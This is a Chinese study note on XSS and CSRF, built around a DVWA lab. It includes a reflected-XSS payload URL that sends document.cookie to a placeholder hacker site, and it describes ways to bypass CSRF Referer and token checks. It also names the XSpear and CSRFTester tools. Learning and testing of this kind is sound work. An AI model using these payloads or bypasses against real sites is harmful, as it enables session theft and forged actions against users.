# XSS与CSRF总结

## **对于XSS的理解(盗取cookie)**

跨站脚本攻击（Cross Site Scripting），就是查看目标站点能否插入并执行javascript,VBscrip，java等脚本代码。**[用户对指定站点的信任]**

首先目标站点存在XSS的漏洞，用户登录到目标站点后，访问一个包含恶意代码的链接，该链接返回携带的恶意代码，浏览器进行解析。在解析恶意代码的时候，就可以获取当前目标站点页面的cookie，并且发生页面跳转。

document.cookie只能获取当前目标站点的cookie,并不是浏览器的所有cookie。
如果再cookie中发现了，http only 说明document.cookie是没有效果的，即不能够从浏览器中获取到cookie，因为此时的cookie保存在服务端。

利用目标站点存在xss漏洞，需要在当前站点的基础之上，点击恶意链接运行恶意代码。（之前以为恶意链接是随意的一个地址，后来发现获取cookie。doucument.cookie必须在当前站点之中才有效果，所以在当前站点的基础之上，再执行恶意代码）

例如：
http://192.168.0.4/dvwa/vulnerabilities/xss_r/ 该站点存在xss(反射性)。我们构造的恶意链接也必然满足：
http://192.168.0.4/dvwa/vulnerabilities/xss_r/ ?name=<script>document.location='黑客站点?cookie='+document.cookie</script>

## **对于CSRF的理解(利用cookie)**

**跨站请求伪造**（Cross-site request forgery），也被称为 **one-click attack** 或者 **session riding**，通常缩写为 **CSRF** 或者 **XSRF**， 是一种挟制用户在当前已登录的Web应用上执行非本意的操作的攻击方法。**[网站对用户网页浏览器的信任]**

简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。

利用CSRF漏洞防御的两种方法。

- 校验Referer

利用**stripos() 函数**比较Referer中是否含有本站的主机名。解决思路：让Referer携带上uri。设置黑客伪造的恶意站点的路径，将目标站点的主机名称或者域名设置为伪造站点的路径，这样当用户在访问恶意链接（黑客伪造的恶意站点）就会在Referer中携带上目标站点的主机名或者域名。

在伪造站点的url添加参数，解决思路：让Referer携带上uri。如伪造站点xxx.html，在末尾添加目标站点的主机名或者域名，即xxx.html?xyxyx(xx.com)，这样在Referer中就存在了目标网站的主机名或者域名.

- 验证token，

利用js代码获取token，完成操作。其实代码的框架就是一个 AJAX 的操作。 AJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。通过 XMLHttpRequest 在页面中加载 csrf 页面然后获取到新的 token 进行提交数据。

## 自动化检测工具

XSS：**XSpear**
在kali中安装：`gem install XSpear`
运行语法：`XSpear pear -u [target] -[options][value]`


CRSF：**CRSFTester**
首先设置浏览器代理
然后运行CSRFTester，然后将捕获到的数据包中，修改参数值然后保存在本地，保持目标站点的登录，然后运行保存的html。查看站点是否发生变化。



